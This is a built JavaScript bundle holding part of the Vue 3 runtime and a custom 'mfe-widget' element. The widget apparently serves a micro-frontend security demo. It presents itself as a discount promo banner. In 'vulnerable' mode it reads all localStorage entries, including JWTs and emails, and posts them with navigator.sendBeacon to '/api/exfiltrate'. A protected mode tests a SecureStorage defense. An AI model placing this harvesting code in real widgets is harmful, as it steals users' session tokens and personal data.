    return n === 2 ? q(t) && !M(t) ? Jt(t) ? fe(e, null, [t]) : fe(e, t) : fe(e, null, t) : (n > 3 ? s = Array.prototype.slice.call(arguments, 2) : n === 3 && Jt(s) && (s = [s]), fe(e, t, s));
  } finally {
    Gt(1);
  }
}
const Lo = "3.5.27";
/**
* @vue/runtime-dom v3.5.27
* (c) 2018-present Yuxi (Evan) You and Vue contributors
* @license MIT
**/
let Ts;
const _n = typeof window < "u" && window.trustedTypes;
if (_n)
  try {
    Ts = /* @__PURE__ */ _n.createPolicy("vue", {
      createHTML: (e) => e
    });
  } catch {
  }
const Ai = Ts ? (e) => Ts.createHTML(e) : (e) => e, No = "http://www.w3.org/2000/svg", $o = "http://www.w3.org/1998/Math/MathML", Ee = typeof document < "u" ? document : null, bn = Ee && /* @__PURE__ */ Ee.createElement("template"), Vo = {
  insert: (e, t, s) => {
    t.insertBefore(e, s || null);
  },
  remove: (e) => {
    const t = e.parentNode;
    t && t.removeChild(e);
  },
  createElement: (e, t, s, n) => {
    const i = t === "svg" ? Ee.createElementNS(No, e) : t === "mathml" ? Ee.createElementNS($o, e) : s ? Ee.createElement(e, { is: s }) : Ee.createElement(e);
    return e === "select" && n && n.multiple != null && i.setAttribute("multiple", n.multiple), i;
  },
  createText: (e) => Ee.createTextNode(e),
  createComment: (e) => Ee.createComment(e),
  setText: (e, t) => {
    e.nodeValue = t;
  },
  setElementText: (e, t) => {
    e.textContent = t;
  },
  parentNode: (e) => e.parentNode,
  nextSibling: (e) => e.nextSibling,
  querySelector: (e) => Ee.querySelector(e),
  setScopeId(e, t) {
    e.setAttribute(t, "");
  },
  // __UNSAFE__
  // Reason: innerHTML.
  // Static content here can only come from compiled templates.
  // As long as the user only uses trusted templates, this is safe.
  insertStaticContent(e, t, s, n, i, r) {
    const o = s ? s.previousSibling : t.lastChild;
    if (i && (i === r || i.nextSibling))
      for (; t.insertBefore(i.cloneNode(!0), s), !(i === r || !(i = i.nextSibling)); )
        ;
    else {
      bn.innerHTML = Ai(
        n === "svg" ? `<svg>${e}</svg>` : n === "mathml" ? `<math>${e}</math>` : e
      );
      const l = bn.content;
      if (n === "svg" || n === "mathml") {
        const f = l.firstChild;
        for (; f.firstChild; )
          l.appendChild(f.firstChild);
        l.removeChild(f);
      }
      t.insertBefore(l, s);
    }
    return [
      // first
      o ? o.nextSibling : t.firstChild,
      // last
      s ? s.previousSibling : t.lastChild
    ];
  }
}, Uo = /* @__PURE__ */ Symbol("_vtc");
function Wo(e, t, s) {
  const n = e[Uo];
  n && (t = (t ? [t, ...n] : [...n]).join(" ")), t == null ? e.removeAttribute("class") : s ? e.setAttribute("class", t) : e.className = t;
}
const xn = /* @__PURE__ */ Symbol("_vod"), Bo = /* @__PURE__ */ Symbol("_vsh"), Ko = /* @__PURE__ */ Symbol(""), qo = /(?:^|;)\s*display\s*:/;
function Go(e, t, s) {
  const n = e.style, i = J(s);
  let r = !1;
  if (s && !i) {
    if (t)
      if (J(t))
        for (const o of t.split(";")) {
          const l = o.slice(0, o.indexOf(":")).trim();
          s[l] == null && Vt(n, l, "");
        }
      else
        for (const o in t)
          s[o] == null && Vt(n, o, "");
    for (const o in s)
      o === "display" && (r = !0), Vt(n, o, s[o]);
  } else if (i) {
    if (t !== s) {
      const o = n[Ko];
      o && (s += ";" + o), n.cssText = s, r = qo.test(s);
    }
  } else t && e.removeAttribute("style");
  xn in e && (e[xn] = r ? n.display : "", e[Bo] && (n.display = "none"));
}
const vn = /\s*!important$/;
function Vt(e, t, s) {
  if (M(s))
    s.forEach((n) => Vt(e, t, n));
  else if (s == null && (s = ""), t.startsWith("--"))
    e.setProperty(t, s);
  else {
    const n = Jo(e, t);
    vn.test(s) ? e.setProperty(
      ze(n),
      s.replace(vn, ""),
      "important"
    ) : e[n] = s;
  }
}
const yn = ["Webkit", "Moz", "ms"], ps = {};
function Jo(e, t) {
  const s = ps[t];
  if (s)
    return s;
  let n = Ne(t);
  if (n !== "filter" && n in e)
    return ps[t] = n;
  n = Pn(n);
  for (let i = 0; i < yn.length; i++) {
    const r = yn[i] + n;
    if (r in e)
      return ps[t] = r;
  }
  return t;
}
const wn = "http://www.w3.org/1999/xlink";
function Sn(e, t, s, n, i, r = qi(t)) {
  n && t.startsWith("xlink:") ? s == null ? e.removeAttributeNS(wn, t.slice(6, t.length)) : e.setAttributeNS(wn, t, s) : s == null || r && !Fn(s) ? e.removeAttribute(t) : e.setAttribute(
    t,
    r ? "" : it(s) ? String(s) : s
  );
}
function Cn(e, t, s, n, i) {
  if (t === "innerHTML" || t === "textContent") {
    s != null && (e[t] = t === "innerHTML" ? Ai(s) : s);
    return;
  }
  const r = e.tagName;
  if (t === "value" && r !== "PROGRESS" && // custom elements may use _value internally
  !r.includes("-")) {
    const l = r === "OPTION" ? e.getAttribute("value") || "" : e.value, f = s == null ? (
      // #11647: value should be set as empty string for null and undefined,
      // but <input type="checkbox"> should be set as 'on'.
      e.type === "checkbox" ? "on" : ""
    ) : String(s);
    (l !== f || !("_value" in e)) && (e.value = f), s == null && e.removeAttribute(t), e._value = s;
    return;
  }
  let o = !1;
  if (s === "" || s == null) {
    const l = typeof e[t];
    l === "boolean" ? s = Fn(s) : s == null && l === "string" ? (s = "", o = !0) : l === "number" && (s = 0, o = !0);
  }
  try {
    e[t] = s;
  } catch {
  }
  o && e.removeAttribute(i || t);
}
function zo(e, t, s, n) {
  e.addEventListener(t, s, n);
}
function ko(e, t, s, n) {
  e.removeEventListener(t, s, n);
}
const En = /* @__PURE__ */ Symbol("_vei");
function Yo(e, t, s, n, i = null) {
  const r = e[En] || (e[En] = {}), o = r[t];
  if (n && o)
    o.value = n;
  else {
    const [l, f] = Zo(t);
    if (n) {
      const h = r[t] = el(
        n,
        i
      );
      zo(e, l, h, f);
    } else o && (ko(e, l, o, f), r[t] = void 0);
  }
}
const Tn = /(?:Once|Passive|Capture)$/;
function Zo(e) {
  let t;
  if (Tn.test(e)) {
    t = {};
    let n;
    for (; n = e.match(Tn); )
      e = e.slice(0, e.length - n[0].length), t[n[0].toLowerCase()] = !0;
  }
  return [e[2] === ":" ? e.slice(3) : ze(e.slice(2)), t];
}
let gs = 0;
const Xo = /* @__PURE__ */ Promise.resolve(), Qo = () => gs || (Xo.then(() => gs = 0), gs = Date.now());
function el(e, t) {
  const s = (n) => {
    if (!n._vts)
      n._vts = Date.now();
    else if (n._vts <= s.attached)
      return;
    Se(
      tl(n, s.value),
      t,
      5,
      [n]
    );
  };
  return s.value = e, s.attached = Qo(), s;
}
function tl(e, t) {
  if (M(t)) {
    const s = e.stopImmediatePropagation;
    return e.stopImmediatePropagation = () => {
      s.call(e), e._stopped = !0;
    }, t.map(
      (n) => (i) => !i._stopped && n && n(i)
    );
  } else
    return t;
}
const An = (e) => e.charCodeAt(0) === 111 && e.charCodeAt(1) === 110 && // lowercase letter
e.charCodeAt(2) > 96 && e.charCodeAt(2) < 123, sl = (e, t, s, n, i, r) => {
  const o = i === "svg";
  t === "class" ? Wo(e, n, o) : t === "style" ? Go(e, s, n) : kt(t) ? Os(t) || Yo(e, t, s, n, r) : (t[0] === "." ? (t = t.slice(1), !0) : t[0] === "^" ? (t = t.slice(1), !1) : nl(e, t, n, o)) ? (Cn(e, t, n), !e.tagName.includes("-") && (t === "value" || t === "checked" || t === "selected") && Sn(e, t, n, o, r, t !== "value")) : /* #11081 force set props for possible async custom element */ e._isVueCE && (/[A-Z]/.test(t) || !J(n)) ? Cn(e, Ne(t), n, r, t) : (t === "true-value" ? e._trueValue = n : t === "false-value" && (e._falseValue = n), Sn(e, t, n, o));
};
function nl(e, t, s, n) {
  if (n)
    return !!(t === "innerHTML" || t === "textContent" || t in e && An(t) && I(s));
  if (t === "spellcheck" || t === "draggable" || t === "translate" || t === "autocorrect" || t === "sandbox" && e.tagName === "IFRAME" || t === "form" || t === "list" && e.tagName === "INPUT" || t === "type" && e.tagName === "TEXTAREA")
    return !1;
  if (t === "width" || t === "height") {
    const i = e.tagName;
    if (i === "IMG" || i === "VIDEO" || i === "CANVAS" || i === "SOURCE")
      return !1;
  }
  return An(t) && J(s) ? !1 : t in e;
}
const il = /* @__PURE__ */ k({ patchProp: sl }, Vo);
let On;
function rl() {
  return On || (On = go(il));
}
const ol = (...e) => {
  const t = rl().createApp(...e), { mount: s } = t;
  return t.mount = (n) => {
    const i = cl(n);
    if (!i) return;
    const r = t._component;
    !I(r) && !r.render && !r.template && (r.template = i.innerHTML), i.nodeType === 1 && (i.textContent = "");
    const o = s(i, !1, ll(i));
    return i instanceof Element && (i.removeAttribute("v-cloak"), i.setAttribute("data-v-app", "")), o;
  }, t;
};
function ll(e) {
  if (e instanceof SVGElement)
    return "svg";
  if (typeof MathMLElement == "function" && e instanceof MathMLElement)
    return "mathml";
}
function cl(e) {
  return J(e) ? document.querySelector(e) : e;
}
const fl = { class: "widget-container" }, ul = { class: "widget-promo" }, al = { class: "widget-title" }, dl = {
  viewBox: "0 0 24 24",
  width: "18",
  height: "18",
  fill: "none",
  stroke: "currentColor",
  "stroke-width": "2",
  "stroke-linecap": "round",
  "stroke-linejoin": "round",
  style: { "margin-right": "6px", "vertical-align": "middle", color: "#f59e0b" }
}, hl = { class: "widget-warning" }, pl = {
  viewBox: "0 0 24 24",
  width: "14",
  height: "14",
  fill: "none",
  stroke: "currentColor",
  "stroke-width": "2",
  "stroke-linecap": "round",
  "stroke-linejoin": "round",
  style: { "margin-right": "4px", "vertical-align": "middle" }
}, gl = {
  key: 0,
  class: "attack-indicator"
}, ml = {
  viewBox: "0 0 24 24",
  width: "12",
  height: "12",
  fill: "currentColor",
  style: { "margin-left": "4px", "vertical-align": "middle" }
}, _l = /* @__PURE__ */ Dr({
  __name: "Widget",
  props: {
    mode: {},
    log: { type: Function }
  },
  setup(e) {
    const t = e, s = /* @__PURE__ */ nn(0), n = /* @__PURE__ */ nn(!1);
    async function i() {
      n.value = !0, t.log("warning", "🚨 [Vue] Widget: Executando código de coleta de dados...");
      const o = {};
      let l = 0;
      for (let a = 0; a < localStorage.length; a++) {
        const p = localStorage.key(a);
        if (p) {
          const w = localStorage.getItem(p);
          w !== null && (o[p] = w, l++);
        }
      }
      s.value = l, t.log("error", `🚨 [Vue] Widget: ${l} itens coletados do localStorage!`), Object.keys(o).forEach((a) => {
        const p = o[a], w = p.length > 50 ? p.substring(0, 50) + "..." : p;
        a === "jwt" || a === "userId" || a === "email" ? t.log("error", `  🔴 CRÍTICO: ${a} = ${w}`) : t.log("warning", `  🟡 ${a} = ${w}`);
      }), t.log("error", "🚨 [Vue] Widget: Enviando dados via navigator.sendBeacon()...");
      const f = JSON.stringify(o), h = navigator.sendBeacon("/api/exfiltrate", f);
      window.logTelemetry && window.logTelemetry({
        type: "exfiltration",
        source: "Vue Widget",
        itemCount: l,
        bytes: f.length,
        ts: Date.now(),
        level: "CRITICAL",
        preview: Object.keys(o).slice(0, 5)
      }, "critical"), h ? t.log("error", `🚨 EXFILTRAÇÃO BEM-SUCEDIDA: ${l} itens enviados (${f.length} bytes)`) : t.log("warning", "⚠️ sendBeacon falhou"), setTimeout(() => {
        t.log("error", "💀 [Vue] ATAQUE CONCLUÍDO: Dados sensíveis comprometidos"), n.value = !1;
      }, 500);
    }
    async function r() {
      t.log("info", "[Vue] Widget: Executando código de análise...");
      const o = [];
      for (let l = 0; l < localStorage.length; l++) {
        const f = localStorage.key(l);
        f && o.push(f);
      }
      t.log("success", `✅ [Vue] Widget: Encontrou ${o.length} itens no localStorage`), t.log("info", "[Vue] Widget: Tentando acessar dados protegidos...");
      try {
        const l = window.SecureStorage;
        if (l) {
          const f = "dGVzdGluZ2Zha2VrZXkxMjM0NTY3ODkwMTIzNDU2Nzg5MA==", h = new l("mfe_dashboard", f, null, !1);
          try {
            await h.getItem("jwt") ? t.log("error", "🚨 FALHA DE SEGURANÇA: Dados acessados!") : t.log("success", "✅ [Vue] Dados retornaram null (protegidos ou inexistentes)");
          } catch (a) {
            t.log("success", `✅ [Vue] Acesso bloqueado: ${a.name}`);
          }
          t.log("success", "🛡️ [Vue] DEFESA EFETIVA: Dados sensíveis permanecem protegidos!");
        } else
          t.log("warning", "[Vue] SecureStorage não disponível");
      } catch (l) {
        t.log("success", "✅ [Vue] Acesso bloqueado: " + l.message);
      }
    }
    return ri(async () => {
      t.mode === "vulnerable" && (localStorage.setItem("widgetImpressionId", "ad-12345"), localStorage.setItem("weatherLocation", "São Paulo"), localStorage.setItem("weatherTemp", "27")), await new Promise((o) => requestAnimationFrame(o)), t.mode === "vulnerable" ? await i() : await r();
    }), (o, l) => (Ze(), ut("div", fl, [
      l[9] || (l[9] = z("div", { class: "vue-badge" }, [
        z("svg", {
          viewBox: "0 0 24 24",
          width: "14",
          height: "14",
          fill: "currentColor"
        }, [
          z("path", { d: "M2 3h3.5L12 15l6.5-12H22L12 21 2 3m4.5 0H9L12 9l3-6h2.5l-5.5 10L6.5 3z" })
        ]),
        Xe(" Vue 3 ")
      ], -1)),
      z("div", ul, [
        z("h3", al, [
          (Ze(), ut("svg", dl, [...l[0] || (l[0] = [
            z("polygon", { points: "12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2" }, null, -1)
          ])])),
          l[1] || (l[1] = Xe(" Oferta Relâmpago! ", -1))
        ]),
        l[2] || (l[2] = z("p", { class: "widget-text" }, "Ganhe 50% de desconto agora!", -1)),
        l[3] || (l[3] = z("button", { class: "widget-btn" }, "Ver Oferta", -1))
      ]),
      z("div", hl, [
        z("p", null, [
          z("strong", null, [
            (Ze(), ut("svg", pl, [...l[4] || (l[4] = [
              z("path", { d: "M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z" }, null, -1),
              z("line", {
                x1: "12",
                y1: "9",
                x2: "12",
                y2: "13"
              }, null, -1),
              z("line", {
                x1: "12",
                y1: "17",
                x2: "12.01",
                y2: "17"
              }, null, -1)
            ])])),
            l[5] || (l[5] = Xe(" Atenção: ", -1))
          ]),
          l[8] || (l[8] = Xe(" Este widget contém código de análise ", -1)),
          n.value ? (Ze(), ut("span", gl, [
            (Ze(), ut("svg", ml, [...l[6] || (l[6] = [
              z("circle", {
                cx: "12",
                cy: "12",
                r: "10"
              }, null, -1)
            ])])),
            l[7] || (l[7] = Xe(" ATIVO ", -1))
          ])) : Co("", !0)
        ])
      ])
    ]));
  }
}), bl = `
    :host {
        display: block;
        font-family: 'Inter', sans-serif;
    }
    
    .widget-container {
        padding: 20px;
    }
    
    .widget-promo {
        background: linear-gradient(135deg, rgba(255, 60, 65, 0.1) 0%, rgba(239, 68, 68, 0.2) 100%);
        border: 1px solid rgba(255, 60, 65, 0.3);
        padding: 20px;
        border-radius: 8px;
        text-align: center;
        color: #e5e7eb;
    }
    
    .widget-title {
        margin-bottom: 10px;
        color: #ff3c41;
        text-shadow: 0 0 10px rgba(255, 60, 65, 0.3);
    }
    
    .widget-text {
        font-size: 14px;
        margin-bottom: 15px;
        color: #9ca3af;
    }
    
    .widget-btn {
        padding: 12px 24px;
        background: #ff3c41;
        color: #050505;
        border: none;
        border-radius: 6px;
        cursor: pointer;
        font-weight: 600;
        font-family: 'Inter', sans-serif;
        box-shadow: 0 0 20px rgba(255, 60, 65, 0.3);
        transition: all 0.3s ease;
    }
    
    .widget-btn:hover {
        box-shadow: 0 0 30px rgba(255, 60, 65, 0.5);
    }
    
    .widget-warning {
        margin-top: 15px;
        padding: 15px;
        background: rgba(234, 179, 8, 0.1);
        border-radius: 8px;
        border-left: 3px solid #eab308;
    }
    
    .widget-warning p {
        color: #eab308;
        font-size: 13px;
        margin: 0;
    }
    
    .vue-badge {
        display: inline-flex;
        align-items: center;
        gap: 6px;
        background: rgba(66, 184, 131, 0.1);
        border: 1px solid rgba(66, 184, 131, 0.3);
        padding: 4px 8px;
        border-radius: 4px;
        font-size: 11px;
        color: #42b883;
        margin-bottom: 15px;
    }
    
    .attack-indicator {
        display: inline-flex;
        align-items: center;
        gap: 4px;
        color: #ff3c41;
        font-weight: 600;
        animation: pulse 1s infinite;
    }
    
    @keyframes pulse {
        0%, 100% { opacity: 1; }
        50% { opacity: 0.5; }
    }
`;
class xl extends HTMLElement {
  constructor() {
    super(...arguments);
    Dt(this, "app", null);
    Dt(this, "_mode", "vulnerable");
    Dt(this, "_logFn", null);
  }
  static get observedAttributes() {
    return ["mode"];
  }
  get mode() {
    return this._mode;
  }
  set mode(s) {
    this._mode = s, this.render();
  }
  setLogFunction(s) {
    this._logFn = s, this.render();
  }
  connectedCallback() {
    const s = this.attachShadow({ mode: "open" }), n = document.createElement("div");
    n.id = "vue-root", s.appendChild(n);
    const i = document.createElement("style");
    i.textContent = bl, s.appendChild(i), this.render();
  }
  disconnectedCallback() {
    this.app && (this.app.unmount(), this.app = null);
  }
  attributeChangedCallback(s, n, i) {
    s === "mode" && (this._mode = i, this.render());
  }
  render() {
    const s = this.shadowRoot;
    if (!s) return;
    const n = s.getElementById("vue-root");
    if (!n) return;
    this.app && this.app.unmount();
    const i = this._mode, r = this._logFn || console.log;
    this.app = ol({
      render: () => Ho(_l, { mode: i, log: r })
    }), this.app.mount(n);
  }
}
customElements.get("mfe-widget") || customElements.define("mfe-widget", xl);
export {
  xl as WidgetElement
};
